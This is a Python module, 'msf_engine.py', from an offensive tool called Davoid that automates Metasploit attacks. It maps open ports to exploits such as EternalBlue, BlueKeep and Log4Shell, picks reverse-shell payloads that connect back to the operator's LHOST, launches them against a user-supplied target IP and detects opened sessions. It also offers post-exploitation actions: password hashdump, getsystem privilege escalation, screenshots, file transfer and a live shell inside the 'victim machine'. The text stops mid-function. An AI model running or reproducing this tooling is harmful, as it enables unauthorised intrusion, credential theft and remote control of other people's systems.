"""
msf_engine.py — Davoid Metasploit RPC Orchestrator
Full production rewrite: reliable shell I/O, bind/reverse awareness,
robust polling, clean interactive REPL, zero silent failures.
"""

import os
import re
import sys
import time
import subprocess
import socket
import string
import random
import questionary
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from core.ui import draw_header, Q_STYLE
from core.context import ctx
from core.database import db

try:
    from pymetasploit3.msfrpc import MsfRpcClient
    _MSF_AVAILABLE = True
except ImportError:
    _MSF_AVAILABLE = False

console = Console()


# ═══════════════════════════════════════════════════════════════════════════════
#  MASTER EXPLOIT DATABASE  (port → [modules], best first)
# ═══════════════════════════════════════════════════════════════════════════════
PORT_EXPLOIT_DB = {
    # FTP
    21: [
        "unix/ftp/vsftpd_234_backdoor",
        "unix/ftp/proftpd_modcopy_exec",
        "unix/ftp/proftpd_133c_backdoor",
        "multi/ftp/wuftpd_site_exec_format_string",
    ],
    # SSH
    22: [
        "linux/ssh/sshexec",
        "linux/ssh/libssh_auth_bypass",
        "multi/ssh/sshkey_persistence",
    ],
    # Telnet
    23: [
        "unix/telnet/telnet_login",
        "linux/telnet/netgear_telnetenable",
    ],
    # SMTP
    25: [
        "unix/smtp/exim4_string_format",
        "unix/smtp/haraka_attachment",
        "linux/smtp/exim_pe_injection",
        "unix/smtp/sendmail_exec",
    ],
    # DNS
    53: [
        "windows/dns/ms09_008_win_dns_ptr",
    ],
    # Finger
    79: [
        "unix/misc/finger_backdoor",
    ],
    # HTTP
    80: [
        "multi/http/apache_normalize_path_rce",
        "multi/http/struts2_content_type_ognl",
        "multi/http/jenkins_script_console",
        "multi/http/tomcat_mgr_upload",
        "multi/http/wp_admin_shell_upload",
        "multi/http/drupalgeddon2",
        "multi/http/joomla_http_header_rce",
        "multi/http/php_cgi_arg_injection",
        "multi/http/webmin_backdoor",
        "multi/http/log4shell_header_injection",
        "multi/http/spring4shell_rce",
        "multi/http/shellshock_header_inject",
    ],
    # POP3
    110: [
        "linux/pop3/dovecot_flag_command_injection",
    ],
    # IDENT / distcc alt
    113: [
        "unix/misc/distcc_exec",
    ],
    # IMAP
    143: [
        "linux/imap/cyrus_imapd_listmailbox",
    ],
    # SNMP
    161: [
        "linux/snmp/net_snmpd_rw_community",
    ],
    # LDAP
    389: [
        "linux/ldap/openldap_slapd_modrdn",
    ],
    # HTTPS
    443: [
        "multi/http/apache_normalize_path_rce",
        "multi/http/struts2_content_type_ognl",
        "multi/ssl/openssl_heartbleed",
        "multi/http/log4shell_header_injection",
    ],
    # SMB
    445: [
        "windows/smb/ms17_010_eternalblue",
        "windows/smb/ms17_010_psexec",
        "windows/smb/ms08_067_netapi",
        "windows/smb/ms06_040_netapi",
        "windows/smb/ms10_061_spoolss",
        "windows/smb/psexec",
        "linux/samba/is_known_pipename",
        "multi/samba/usermap_script",
    ],
    # CUPS
    631: [
        "unix/misc/cups_bash_env_exec",
    ],
    # Java RMI
    1099: [
        "multi/misc/java_rmi_server",
    ],
    # NTP
    123: [
        "linux/misc/ntp_monlist_dos",
    ],
    # MSSQL
    1433: [
        "windows/mssql/mssql_exec",
        "windows/mssql/mssql_payload",
        "windows/mssql/mssql_clr_payload",
    ],
    # Oracle
    1521: [
        "windows/oracle/oracle_login",
        "windows/oracle/tns_auth_sesskey",
    ],
    # NFS
    2049: [
        "linux/nfs/nfsd_write",
    ],
    # Docker
    2375: ["linux/http/docker_daemon_tcp"],
    2376: ["linux/http/docker_daemon_tcp"],
    # GitLab / Gogs
    3000: [
        "multi/http/gogs_exec",
        "multi/http/gitlab_exif_rce",
    ],
    # Squid
    3128: [
        "multi/http/squid_cache_manager",
    ],
    # MySQL
    3306: [
        "linux/mysql/mysql_yassl_getali",
        "multi/mysql/mysql_udf_payload",
        "linux/mysql/mysql_secure_moo",
    ],
    # RDP
    3389: [
        "windows/rdp/cve_2019_0708_bluekeep_rce",
        "windows/rdp/ms12_020_maxchannelids",
    ],
    # PostgreSQL
    5432: [
        "linux/postgres/postgres_payload",
        "multi/postgres/postgres_copy_from_program_cmd_exec",
    ],
    # HP Data Protector
    5555: [
        "windows/misc/hp_dataprotector_exec_bar",
    ],
    # WinRM
    5985: ["windows/winrm/winrm_script_exec"],
    5986: ["windows/winrm/winrm_script_exec"],
    # CouchDB
    5984: [
        "linux/http/couchdb_cmd_injection",
    ],
    # VNC
    5900: ["multi/vnc/vnc_keyboard_exec", "windows/vnc/ultravnc_client"],
    5901: ["multi/vnc/vnc_keyboard_exec"],
    # X11
    6000: ["unix/x11/open_x11"],
    # distcc
    6200: ["unix/misc/distcc_exec"],
    # IRC
    6667: ["unix/irc/unreal_ircd_3281_backdoor"],
    # Kubernetes
    6443: ["multi/http/kubernetes_exec"],
    # Redis
    6379: [
        "linux/redis/redis_replication_cmd_exec",
        "linux/redis/redis_unauth_exec",
    ],
    # WebLogic
    7001: [
        "multi/misc/weblogic_deserialize_asyncresponseservice",
        "multi/misc/weblogic_deserialize_badattrval",
    ],
    7002: ["multi/misc/weblogic_deserialize_asyncresponseservice"],
    # HTTP alt
    7777: ["multi/http/axis2_deployer"],
    # AJP / Tomcat
    8009: ["multi/http/apache_mod_jk_overflow"],
    8080: [
        "multi/http/tomcat_mgr_upload",
        "multi/http/tomcat_mgr_deploy",
        "multi/http/jenkins_script_console",
        "multi/http/apache_normalize_path_rce",
        "multi/http/log4shell_header_injection",
    ],
    8181: ["multi/http/jetty_ajpbug_fileread"],
    8443: [
        "multi/http/log4shell_header_injection",
        "multi/http/spring4shell_rce",
    ],
    8888: ["multi/http/jupyter_magics_exec"],
    # Splunk
    8089: ["multi/http/splunk_upload_app_exec"],
    # Elasticsearch
    9200: ["multi/elasticsearch/search_groovy_script_code_execution"],
    9300: ["multi/elasticsearch/search_groovy_script_code_execution"],
    # JMX
    9999: ["multi/misc/java_jmx_server"],
    # Webmin
    10000: ["multi/http/webmin_backdoor", "multi/http/webmin_file_disclosure"],
    # Memcached
    11211: ["linux/misc/memcached_udp_dos"],
    # RabbitMQ
    15672: ["multi/http/rabbitmq_management_exec"],
    # MongoDB
    27017: ["linux/mongodb/mongodb_unauth_exec"],
    # Rsync
    873: ["linux/misc/rsync_exec"],
}


# ═══════════════════════════════════════════════════════════════════════════════
#  PAYLOAD INTELLIGENCE
# ═══════════════════════════════════════════════════════════════════════════════

# Fine-grained overrides checked first (substring match against module path)
PAYLOAD_OVERRIDES = {
    "vsftpd":       "cmd/unix/interact",
    "proftpd":      "cmd/unix/interact",
    "ircd":         "cmd/unix/interact",
    "distcc":       "cmd/unix/interact",
    "libssh":       "cmd/unix/interact",
    "finger":       "cmd/unix/interact",
    "x11":          "cmd/unix/interact",
    "rsync":        "cmd/unix/interact",
    "telnet":       "cmd/unix/interact",
    "samba":        "cmd/unix/reverse_netcat",
    "usermap":      "cmd/unix/reverse_netcat",
    "pe_injection": "windows/x64/meterpreter/reverse_tcp",
    "bluekeep":     "windows/x64/meterpreter/reverse_tcp",
    "eternalblue":  "windows/x64/meterpreter/reverse_tcp",
    "ms08_067":     "windows/x64/meterpreter/reverse_tcp",
    "ms17_010":     "windows/x64/meterpreter/reverse_tcp",
    "postgres":     "linux/x86/meterpreter/reverse_tcp",
    "mysql":        "linux/x86/meterpreter/reverse_tcp",
    "redis":        "linux/x86/meterpreter/reverse_tcp",
    "log4shell":    "linux/x86/meterpreter/reverse_tcp",
    "spring4shell": "linux/x86/meterpreter/reverse_tcp",
    "shellshock":   "linux/x86/meterpreter/reverse_tcp",
    "php":          "php/meterpreter/reverse_tcp",
    "java":         "java/jsp_shell_reverse_tcp",
    "tomcat":       "java/jsp_shell_reverse_tcp",
    "jenkins":      "java/jsp_shell_reverse_tcp",
}

# Platform keyword fallbacks
PAYLOAD_PLATFORM_MAP = {
    "windows": "windows/x64/meterpreter/reverse_tcp",
    "osx":     "osx/x64/meterpreter_reverse_tcp",
    "apple":   "osx/x64/meterpreter_reverse_tcp",
    "linux":   "linux/x86/meterpreter/reverse_tcp",
    "unix":    "cmd/unix/interact",
    "android": "android/meterpreter/reverse_tcp",
}

# Modules that open a BIND shell on the target — no LHOST/LPORT needed
BIND_SHELL_MODULES = {
    "unix/ftp/vsftpd_234_backdoor",
    "unix/ftp/proftpd_133c_backdoor",
    "unix/irc/unreal_ircd_3281_backdoor",
    "unix/misc/distcc_exec",
    "linux/ssh/libssh_auth_bypass",
    "unix/x11/open_x11",
    "unix/misc/finger_backdoor",
}

ALL_PAYLOADS = [
    "windows/x64/meterpreter/reverse_tcp",
    "windows/meterpreter/reverse_tcp",
    "windows/x64/shell_reverse_tcp",
    "windows/x64/meterpreter/bind_tcp",
    "linux/x64/meterpreter/reverse_tcp",
    "linux/x86/meterpreter/reverse_tcp",
    "linux/x64/shell_reverse_tcp",
    "linux/x86/shell_reverse_tcp",
    "cmd/unix/interact",
    "cmd/unix/reverse_netcat",
    "cmd/unix/reverse_bash",
    "cmd/unix/bind_netcat",
    "php/meterpreter/reverse_tcp",
    "php/reverse_php",
    "java/jsp_shell_reverse_tcp",
    "android/meterpreter/reverse_tcp",
    "osx/x64/meterpreter_reverse_tcp",
    "python/meterpreter/reverse_tcp",
]

# Commands that need more time to produce output
SLOW_CMDS = {
    'find', 'locate', 'grep', 'cat', 'ls', 'ps', 'netstat', 'ss',
    'ifconfig', 'ip', 'id', 'uname', 'whoami', 'pwd', 'env',
    'history', 'sudo', 'chmod', 'chown', 'arp', 'route', 'nmap',
    'python', 'perl', 'ruby', 'bash', 'sh', 'wget', 'curl',
}


def smart_payload(module_path: str) -> str:
    """Returns the most appropriate payload for a given module path."""
    m = module_path.lower()
    for key, payload in PAYLOAD_OVERRIDES.items():
        if key in m:
            return payload
    for key, payload in PAYLOAD_PLATFORM_MAP.items():
        if key in m:
            return payload
    return "linux/x86/meterpreter/reverse_tcp"


# ═══════════════════════════════════════════════════════════════════════════════
#  ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class MetasploitRPCEngine:

    def __init__(self):
        self.client = None
        self.daemon_proc = None
        self.password = ''.join(random.choices(
            string.ascii_letters + string.digits, k=16))
        self.rpc_port = 55554
        self.msfrpcd_path = self._find_msfrpcd()

    # ─────────────────────────────────────────
    #  System helpers
    # ─────────────────────────────────────────

    def _find_msfrpcd(self):
        common = [
            "/opt/metasploit-framework/bin/msfrpcd",
            "/opt/homebrew/bin/msfrpcd",
            "/usr/local/bin/msfrpcd",
            "/usr/bin/msfrpcd",
        ]
        try:
            p = subprocess.run(['which', 'msfrpcd'],
                               capture_output=True, text=True).stdout.strip()
            if p and os.path.exists(p):
                return p
        except Exception:
            pass
        for p in common:
            if os.path.exists(p):
                return p
        return None

    def _check_deps(self):
        if not _MSF_AVAILABLE:
            console.print(
                "[bold red][!] Missing dependency: pymetasploit3[/bold red]")
            console.print(
                "[yellow]    Run: pip install pymetasploit3[/yellow]")
            return False
        if not self.msfrpcd_path:
            console.print(
                "[bold red][!] msfrpcd not found — install Metasploit Framework.[/bold red]")
            return False
        return True

    def _port_open(self, port, host='127.0.0.1'):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            return s.connect_ex((host, port)) == 0

    def _kill_port(self):
        if sys.platform == 'darwin':
            os.system(
                f"lsof -ti:{self.rpc_port} | xargs kill -9 >/dev/null 2>&1")
        else:
            os.system(f"fuser -k {self.rpc_port}/tcp >/dev/null 2>&1")

    # ─────────────────────────────────────────
    #  Daemon / RPC connection
    # ─────────────────────────────────────────

    def _start_daemon(self):
        if self._port_open(self.rpc_port):
            self._kill_port()
            time.sleep(1)

        cmd = [
            self.msfrpcd_path,
            "-P", self.password,
            "-n", "-f",
            "-a", "127.0.0.1",
            "-p", str(self.rpc_port),
        ]
        self.daemon_proc = subprocess.Popen(
            cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        with console.status(
                "[bold cyan]Booting Metasploit Engine (~15s)...[/bold cyan]",
                spinner="bouncingBar"):
            for _ in range(50):
                if self._port_open(self.rpc_port):
                    time.sleep(3)
                    return True
                time.sleep(1)
        return False

    def connect_rpc(self):
        if self.client:
            return True
        if not self._start_daemon():
            console.print(
                "[bold red][!] MSF daemon failed to start.[/bold red]")
            return False
        console.print("[*] Connecting to MSF-RPC...")
        try:
            self.client = MsfRpcClient(
                self.password, server='127.0.0.1', port=self.rpc_port, ssl=True)
            console.print(
                "[bold green][+] MSF-RPC authenticated.[/bold green]")
            time.sleep(0.5)
            return True
        except Exception as e:
            console.print(
                f"[bold red][!] RPC connection failed:[/bold red] {e}")
            return False

    def cleanup(self):
        if self.daemon_proc:
            console.print("[dim][*] Shutting down MSF daemon...[/dim]")
            try:
                self.daemon_proc.terminate()
                self.daemon_proc.wait(timeout=5)
            except Exception:
                pass
            self._kill_port()

    # ─────────────────────────────────────────
    #  MSF console helpers
    # ─────────────────────────────────────────

    def _new_console(self):
        return self.client.consoles.console()

    def _poll_console(self, con, max_iter=30, sleep=1.0):
        """
        Poll an MSF console until it goes idle.
        Returns all accumulated output as a string.
        """
        buf = ""
        for _ in range(max_iter):
            time.sleep(sleep)
            try:
                out = con.read()
            except Exception:
                break
            if out and out.get('data'):
                buf += out['data']
            if out and out.get('busy') is False:
                break
        return buf

    # ─────────────────────────────────────────
    #  Shell I/O helpers
    # ─────────────────────────────────────────

    def _drain_shell(self, shell, timeout=8.0, min_wait=0.25):
        """
        Drain a raw shell's output buffer with a sliding deadline.
        Resets the deadline whenever new data arrives so long-running
        commands aren't cut off mid-output.
        """
        buf = ""
        time.sleep(min_wait)
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                chunk = shell.read()
            except Exception:
                break
            if chunk:
                buf += chunk
                deadline = time.time() + 2.5   # more output may be on the way
            else:
                time.sleep(0.1)
        return buf

    def _meterpreter_exec(self, shell, cmd, timeout=20):
        """
        Execute a Meterpreter command, return output string.
        Handles both old and new pymetasploit3 API signatures.
        """
        try:
            result = shell.run_with_output(cmd, timeout=timeout)
        except TypeError:
            # Older pymetasploit3 doesn't accept timeout kwarg
            try:
                result = shell.run_with_output(cmd)
            except Exception as e:
                return f"[error] {e}"
        except Exception as e:
            return f"[error] {e}"
        return result.strip() if result else "(no output)"

    # ─────────────────────────────────────────
    #  Search
    # ─────────────────────────────────────────

    def search_modules(self):
        keyword = questionary.text(
            "Search keyword (e.g. vsftpd, eternalblue, smb):", style=Q_STYLE).ask()
        if not keyword:
            return

        with console.status(f"[cyan]Searching MSF DB for '{keyword}'...[/cyan]", spinner="dots"):
            try:
                con = self._new_console()
                con.write(f"search {keyword}\n")
                raw = self._poll_console(con, max_iter=30, sleep=1.0)
            except Exception as e:
                console.print(f"[red][!] Search error: {e}[/red]")
                return

        if not raw.strip():
            console.print("[yellow][!] No results or timed out.[/yellow]")
            return

        lines = raw.splitlines()
        if len(lines) > 60:
            raw = "\n".join(
                lines[:60]) + "\n\n[dim]... truncated — use a more specific keyword[/dim]"
        console.print(
            Panel(raw, title=f"[cyan]Results: {keyword}[/cyan]", border_style="cyan"))

    # ─────────────────────────────────────────
    #  Auto-Exploit
    # ─────────────────────────────────────────

    def auto_exploit(self):
        # Gather target details
        target = questionary.text(
            "Target IP (RHOST):",
            default=ctx.get("RHOST") or "192.168.1.1",
            style=Q_STYLE).ask()
        if not target:
            return

        rport_raw = questionary.text(
            "Target Port (RPORT):", style=Q_STYLE).ask()
        if not rport_raw or not rport_raw.strip().isdigit():
            console.print("[red][!] Invalid port.[/red]")
            return
        rport = int(rport_raw.strip())

        lhost = questionary.text(
            "Your IP (LHOST):",
            default=ctx.get("LHOST") or "127.0.0.1",
            style=Q_STYLE).ask()
        if not lhost:
            return

        lport = questionary.text(
            "Your LPORT:", default="4444", style=Q_STYLE).ask() or "4444"

        # Dynamic MSF DB query
        rank_scores = {
            "excellent": 7, "great": 6, "good": 5,
            "normal": 4, "average": 3, "low": 2, "manual": 1,
        }
        parsed_dyn = []

        try:
            con = self._new_console()
            con.write(f"search port:{rport} type:exploit\n")
            with console.status(
                    f"[cyan]Querying live MSF DB for port {rport}...[/cyan]", spinner="dots"):
                raw = self._poll_console(con, max_iter=30, sleep=1.0)

            if raw:
                display_lines = []
                for line in raw.splitlines():
                    if any(x in line for x in ["Name", "----", "====", "exploit/"]):
                        display_lines.append(line)
                    if "exploit/" in line:
                        parts = line.split()
                        mod = next(
                            (p for p in parts if p.startswith("exploit/")), None)
                        rank = next(
                            (r for r in rank_scores if r in line.lower()), "normal")
                        if mod:
                            clean = mod.replace("exploit/", "", 1)
                            parsed_dyn.append({
                                'path':  clean,
                                'rank':  rank,
                                'score': rank_scores[rank],
                            })

                if display_lines:
                    console.print(Panel(
                        "\n".join(display_lines[:30]),
                        title=f"[green]Live MSF DB — Port {rport}[/green]",
                        border_style="green"
                    ))
        except Exception as e:
            console.print(f"[dim red]Live query error: {e}[/dim red]")

        # Merge dynamic + static, deduplicated
        parsed_dyn.sort(key=lambda x: x['score'], reverse=True)
        merged = [m['path'] for m in parsed_dyn]
        for s in PORT_EXPLOIT_DB.get(rport, []):
            if s not in merged:
                merged.append(s)

        # Module selection
        if not merged:
            console.print(
                f"[yellow][-] No modules found for port {rport}.[/yellow]")
            custom_mod = questionary.text(
                "Enter module path manually:", style=Q_STYLE).ask()
        else:
            choices = []
            for path in merged[:20]:
                rank_label = next(
                    (m['rank'].upper() for m in parsed_dyn if m['path'] == path), "DB")
                choices.append(f"[{rank_label}] {path}")
            choices += [questionary.Separator(), "✎  Manual Entry"]

            sel = questionary.select(
                f"Select exploit for port {rport} (sorted by reliability):",
                choices=choices, style=Q_STYLE).ask()

            if not sel:
                return
            if "Manual Entry" in sel:
                fallback = PORT_EXPLOIT_DB.get(rport, [""])[0]
                custom_mod = questionary.text(
                    "Exploit module path:", default=fallback, style=Q_STYLE).ask()
            else:
                custom_mod = sel.split("] ", 1)[1].strip()

        if not custom_mod:
            return

        is_bind = custom_mod in BIND_SHELL_MODULES

        # Payload selection
        default_payload = smart_payload(custom_mod)
        payload_list = list(ALL_PAYLOADS)
        if default_payload not in payload_list:
            payload_list.insert(0, default_payload)

        custom_payload = questionary.select(
            f"Select payload  [auto-suggested: {default_payload}]:",
            choices=payload_list +
            [questionary.Separator(), "✎  Custom payload"],
            default=default_payload,
            style=Q_STYLE
        ).ask()

        if not custom_payload:
            return
        if "Custom payload" in custom_payload:
            custom_payload = questionary.text(
                "Payload path:", default=default_payload, style=Q_STYLE).ask()
        if not custom_payload:
            return

        # Summary
        bind_note = "\n[yellow]⚡ Bind-shell — LHOST/LPORT not required[/yellow]" if is_bind else ""
        console.print(Panel(
            f"[bold cyan]Launching Exploit[/bold cyan]{bind_note}\n"
            f"[white]Target :[/white] {target}:{rport}\n"
            f"[white]Module :[/white] {custom_mod}\n"
            f"[white]Payload:[/white] {custom_payload}\n"
            f"[white]LHOST  :[/white] {lhost}:{lport}",
            border_style="red"
        ))

        # Execute
        exec_flag = "run" if is_bind else "exploit -j -z"
        try:
            con = self._new_console()
            con.write(f"use {custom_mod}\n")
            time.sleep(0.4)
            con.write(f"setg RHOSTS {target}\n")
            con.write(f"setg RHOST  {target}\n")
            con.write(f"setg RPORT  {rport}\n")
            if not is_bind:
                con.write(f"setg LHOST {lhost}\n")
                con.write(f"setg LPORT {lport}\n")
            con.write(f"set PAYLOAD {custom_payload}\n")
            time.sleep(0.3)

            # Local priv-esc detection
            if any(k in custom_mod.lower() for k in ["local", "pe_injection", "priv"]):
                console.print(
                    "\n[yellow][!] Local privilege-escalation module detected.[/yellow]")
                sid = questionary.text(
                    "Active SESSION ID to upgrade:", style=Q_STYLE).ask()
                if sid:
                    con.write(f"set SESSION {sid}\n")

            con.write(f"{exec_flag}\n")
            db.log("MSF-Engine", target, f"Attempted {custom_mod}", "INFO")

            # Capture console output
            out_buf = ""
            stop_toks = [
                "exploit completed", "session", "command shell",
                "meterpreter session", "failed", "error",
            ]
            max_i = 25 if is_bind else 15
            slp = 2.0 if is_bind else 1.5

            with console.status(
                    "[cyan]Executing — reading MSF output...[/cyan]", spinner="dots"):
                for _ in range(max_i):
                    time.sleep(slp)
                    chunk = con.read()
                    if chunk and chunk.get('data'):
                        out_buf += chunk['data']
                        if any(t in chunk['data'].lower() for t in stop_toks):
                            break

            if out_buf.strip():
                console.print(f"\n[dim]{out_buf.strip()}[/dim]")

            # Session check
            chk_iter = 10 if is_bind else 6
            chk_sleep = 2.5 if is_bind else 2.0
            with console.status(
                    "[cyan]Checking for sessions...[/cyan]", spinner="bouncingBar"):
                found = False
                for _ in range(chk_iter):
                    time.sleep(chk_sleep)
                    sessions = self.client.sessions.list
                    if sessions:
                        n = len(sessions)
                        console.print(
                            f"\n[bold green][+] {n} session(s) opened! "
                            f"Use 'Active Sessions' to interact.[/bold green]")
                        db.log("MSF-Engine", target,
                               f"Shell: {custom_mod}", "CRITICAL")
                        found = True
                        break

                if not found:
                    console.print(
                        "\n[yellow][-] No session detected.\n"
                        "    Possible reasons:\n"
                        "    • Target is not vulnerable to this specific module\n"
                        "    • Firewall blocking the connection\n"
                        "    • For bind-shells: confirm port 6200 is reachable\n"
                        "    • Check 'Active Sessions' — it may appear late[/yellow]")

        except Exception as e:
            console.print(f"[bold red][!] Exploit failed:[/bold red] {e}")

    # ─────────────────────────────────────────
    #  Session listing
    # ─────────────────────────────────────────

    def _list_sessions_table(self):
        """Print sessions table. Returns sessions dict (may be empty)."""
        try:
            sessions = self.client.sessions.list
        except Exception as e:
            console.print(f"[red][!] Could not fetch sessions: {e}[/red]")
            return {}

        if not sessions:
            console.print("[yellow][!] No active sessions.[/yellow]")
            return {}

        table = Table(title="Active MSF Sessions",
                      border_style="green", expand=True)
        table.add_column("ID",     style="bold cyan",
                         justify="center", no_wrap=True)
        table.add_column("Type",   style="magenta",   no_wrap=True)
        table.add_column("Target", style="white",     no_wrap=True)
        table.add_column("Info",   style="dim")
        table.add_column("Tunnel", style="dim")

        for sid, data in sessions.items():
            table.add_row(
                str(sid),
                data.get('type',         'unknown'),
                data.get('target_host',  '?'),
                data.get('info',         ''),
                data.get('tunnel_local', ''),
            )
        console.print(table)
        return sessions

    # ─────────────────────────────────────────
    #  Interactive session REPL
    # ─────────────────────────────────────────

    def interact_session(self):
        sessions = self._list_sessions_table()
        if not sessions:
            return

        sid = questionary.text(
            "Session ID to interact with (blank = cancel):", style=Q_STYLE).ask()
        if not sid:
            return
        if sid not in sessions:
            console.print("[red][!] Invalid session ID.[/red]")
            return

        stype = sessions[sid].get('type',        'shell')
        shost = sessions[sid].get('target_host', '?')
        sinfo = sessions[sid].get('info',        '')

        try:
            shell = self.client.sessions.session(sid)
        except Exception as e:
            console.print(f"[red][!] Cannot attach to session: {e}[/red]")
            return

        # ── Meterpreter quick-action menu ──────────────────
        if stype == 'meterpreter':
            action = questionary.select(
                "Meterpreter Quick Actions:",
                choices=[
                    "1. Interactive Shell (full REPL)",
                    "2. sysinfo + getuid",
                    "3. Hashdump",
                    "4. Process list (ps)",
                    "5. Network interfaces",
                    "6. Screenshot",
                    "7. Upload file",
                    "8. Download file",
                    "9. Escalate privileges (getsystem)",
                ],
                style=Q_STYLE
            ).ask()

            if not action or "Interactive" in action:
                pass  # fall through to full REPL below

            elif "sysinfo" in action:
                console.print(
                    f"[white]{self._meterpreter_exec(shell, 'sysinfo')}[/white]")
                console.print(
                    f"[white]{self._meterpreter_exec(shell, 'getuid')}[/white]")
                questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                return

            elif "Hashdump" in action:
                console.print("[cyan]Dumping hashes (needs SYSTEM)...[/cyan]")
                console.print(
                    f"[white]{self._meterpreter_exec(shell, 'hashdump', timeout=30)}[/white]")
                questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                return

            elif "Process" in action:
                console.print(
                    f"[white]{self._meterpreter_exec(shell, 'ps')}[/white]")
                questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                return

            elif "Network" in action:
                result = self._meterpreter_exec(shell, 'ipconfig')
                if "error" in result.lower():
                    result = self._meterpreter_exec(shell, 'ifconfig')
                console.print(f"[white]{result}[/white]")
                questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                return

            elif "Screenshot" in action:
                console.print(
                    f"[white]{self._meterpreter_exec(shell, 'screenshot')}[/white]")
                questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                return

            elif "Upload" in action:
                lp = questionary.text("Local path:", style=Q_STYLE).ask()
                rp = questionary.text("Remote path:", style=Q_STYLE).ask()
                if lp and rp:
                    console.print(
                        f"[white]{self._meterpreter_exec(shell, f'upload {lp} {rp}', timeout=120)}[/white]")
                questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                return

            elif "Download" in action:
                rp = questionary.text("Remote path:", style=Q_STYLE).ask()
                lp = questionary.text("Local path:", style=Q_STYLE).ask()
                if rp and lp:
                    console.print(
                        f"[white]{self._meterpreter_exec(shell, f'download {rp} {lp}', timeout=120)}[/white]")
                questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                return

            elif "getsystem" in action:
                console.print(
                    "[cyan]Attempting privilege escalation...[/cyan]")
                console.print(
                    f"[white]{self._meterpreter_exec(shell, 'getsystem', timeout=30)}[/white]")
                console.print(
                    f"[white]{self._meterpreter_exec(shell, 'getuid')}[/white]")
                questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                return

        # ── Full interactive REPL ──────────────────────────
        prompt_label = "meterpreter" if stype == "meterpreter" else "shell"

        console.print(Panel(
            f"[bold green]● Session {sid}  [{stype}]  →  {shost}[/bold green]\n"
            f"[dim]{sinfo}[/dim]\n\n"
            "[dim cyan]You are now inside the victim machine.\n"
            "Type any command — output appears below.\n"
            "  [bold]background[/bold]  or  [bold]exit[/bold]  → return to Davoid\n"
            "  [bold]Ctrl+C[/bold]  → interrupt running command[/dim cyan]",
            border_style="bold green",
            title="[bold white]● LIVE SHELL[/bold white]"
        ))

        # Prime raw shells with a newline to get an initial prompt
        if stype != 'meterpreter':
            try:
                shell.write('\n')
                initial = self._drain_shell(shell, timeout=3.0, min_wait=0.5)
                if initial.strip():
                    clean = re.sub(r'\x1b\[[0-9;]*[mGKHF]', '', initial)
                    sys.stdout.write(clean)
                    if not clean.endswith('\n'):
                        sys.stdout.write('\n')
                    sys.stdout.flush()
            except Exception:
                pass

        # ── REPL loop ──────────────────────────────────────
        # We use sys.stdin / sys.stdout directly for the cleanest terminal
        # feel — questionary overhead causes display artefacts with live output.
        while True:
            # Print prompt
            sys.stdout.write(
                f"\033[1;36m{prompt_label}:{shost} ({sid}) > \033[0m")
            sys.stdout.flush()

            # Read command
            try:
                line = sys.stdin.readline()
            except KeyboardInterrupt:
                console.print(
                    "\n[yellow][*] Detaching — session stays active.[/yellow]")
                break
            except EOFError:
                break

            if line is None:
                break

            cmd = line.rstrip('\n').rstrip('\r')

            if not cmd.strip():
                continue

            if cmd.strip().lower() in ['exit', 'quit', 'background']:
                console.print("[yellow][*] Session backgrounded.[/yellow]")
                break

            # ── Meterpreter commands ───────────────────────
            if stype == 'meterpreter':
                try:
                    output = self._meterpreter_exec(shell, cmd)
                    if output:
                        sys.stdout.write(output)
                        if not output.endswith('\n'):
                            sys.stdout.write('\n')
                        sys.stdout.flush()
                except KeyboardInterrupt:
                    sys.stdout.write('\n')
                    sys.stdout.flush()

            # ── Raw shell commands ─────────────────────────
            else:
                try:
                    shell.write(cmd + '\n')

                    # Adaptive timeout — slow commands get more time
                    first_word = cmd.strip().split()[
                        0].lower() if cmd.strip() else ''
                    timeout = 15.0 if first_word in SLOW_CMDS else 7.0

                    output = self._drain_shell(
                        shell, timeout=timeout, min_wait=0.3)

                    if output:
                        # Strip terminal escape codes so Rich doesn't get confused
                        clean = re.sub(r'\x1b\[[0-9;]*[mGKHF]', '', output)
                        sys.stdout.write(clean)
                        if not clean.endswith('\n'):
                            sys.stdout.write('\n')
                        sys.stdout.flush()
                    else:
                        sys.stdout.write(
                            "[no output — command may have run silently]\n")
                        sys.stdout.flush()

                except KeyboardInterrupt:
                    # Forward interrupt to victim, keep our loop alive
                    try:
                        shell.write('\x03')
                    except Exception:
                        pass
                    sys.stdout.write('\n')
                    sys.stdout.flush()

                except Exception as e:
                    console.print(f"[bold red][!] Shell error:[/bold red] {e}")
                    break

    # ─────────────────────────────────────────
    #  Job manager
    # ─────────────────────────────────────────

    def manage_jobs(self):
        try:
            jobs = self.client.jobs.list
        except Exception as e:
            console.print(f"[red][!] Cannot fetch jobs: {e}[/red]")
            return

        if not jobs:
            console.print("[yellow][!] No background jobs running.[/yellow]")
            return

        table = Table(title="Background Jobs",
                      border_style="blue", expand=True)
        table.add_column("ID",   style="cyan",  justify="center")
        table.add_column("Name", style="white")
        for jid, jname in jobs.items():
            table.add_row(str(jid), jname)
        console.print(table)

        kill_id = questionary.text(
            "Job ID to kill (blank = cancel):", style=Q_STYLE).ask()
        if kill_id and kill_id in jobs:
            try:
                self.client.jobs.stop(kill_id)
                console.print(f"[green][+] Job {kill_id} killed.[/green]")
            except Exception as e:
                console.print(f"[red][!] Kill failed: {e}[/red]")

    # ─────────────────────────────────────────
    #  Multi/Handler listener
    # ─────────────────────────────────────────

    def start_listener(self):
        lhost = ctx.get("LHOST") or "0.0.0.0"
        lport = questionary.text(
            "LPORT:", default="4444", style=Q_STYLE).ask() or "4444"

        choices = list(ALL_PAYLOADS) + [questionary.Separator(), "✎  Custom"]
        payload = questionary.select(
            "Select payload for listener:", choices=choices, style=Q_STYLE).ask()
        if not payload:
            return
        if "Custom" in payload:
            payload = questionary.text(
                "Payload path:",
                default="windows/x64/meterpreter/reverse_tcp",
                style=Q_STYLE).ask()
        if not payload:
            return

        try:
            con = self._new_console()
            con.write("use exploit/multi/handler\n")
            con.write(f"set PAYLOAD {payload}\n")
